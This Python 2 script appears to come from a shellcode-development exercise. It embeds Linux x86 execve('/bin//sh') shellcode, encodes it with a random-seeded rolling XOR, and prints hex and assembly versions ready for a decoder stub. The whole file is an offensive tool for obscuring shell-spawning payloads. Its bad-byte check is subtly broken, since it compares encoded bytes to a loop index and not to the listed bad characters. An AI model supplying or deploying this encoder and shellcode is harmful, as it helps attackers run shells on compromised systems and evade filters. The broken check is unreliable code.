#!/usr/bin/python
# Author: hodorsec
# Filename: rolling-xor-encoder-random.py
# Python Rolling XOR Encoder random byte
import os
import sys
import random

# Execve shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
# Possible badbytes
badbytes = ("\x0a\x0d\x00")

# Initializing array
encoded = []

# Initialize PRNG
randomint = random.randint(1,255)

# Initialize array with a random integer, also important for decoding
encoded.append(randomint)

# Do a for loop, iterating over the bytearray for each byte in shellcode
def encode():
	for x in range(0, len(shellcode)):
		for y in range(0, len(badbytes)):
			if ((ord(shellcode[x]) ^ encoded[x]) == y):
				print "\n[!] Encoded shellcode contains bad characters, try again..."
				exit(0)
		z = ord(shellcode[x]) ^ encoded[x]
		encoded.append(z)

print '[*] Encoding shellcode ...'
encode()

# HEX variant
hex_coded = "\"" + ("".join("\\x%02x" %c for c in encoded)) + "\""
# ASM variant
asm_coded = "EncodedShellcode: db " + (",".join("0x%02x" %c for c in encoded))

# Print format for hex shellcode, e.g. \xaa\xbb\xcc, etc
print "\n[*] Hex shellcode"
print hex_coded

# Print format for ASM shellcode, e.g. 0xAA, 0xBB, etc
print "\n[*] ASM shellcode"
print asm_coded

# Print the length of the shellcode
print '\n[*] Length: %d' % (len(encoded)-1)

